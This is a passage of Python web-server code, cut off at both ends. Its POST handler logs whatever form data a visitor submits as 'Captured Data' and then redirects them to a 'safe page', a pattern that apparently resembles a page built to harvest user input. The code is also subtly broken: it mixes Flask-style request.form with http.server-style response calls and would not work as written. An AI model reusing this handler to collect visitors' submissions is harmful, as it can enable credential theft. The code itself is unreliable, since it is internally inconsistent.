        return self.html

    def do_POST(self, request):
        # Log input data
        data = request.form
        # Example: Print or store the captured data for analysis
        print(f"Captured Data: {data}")
        # Redirect to a safe page
        self.send_response(301)
        self.send_header('Location', '/safe-page')
        self.end_headers()

# Define the HTML content
html_content = """
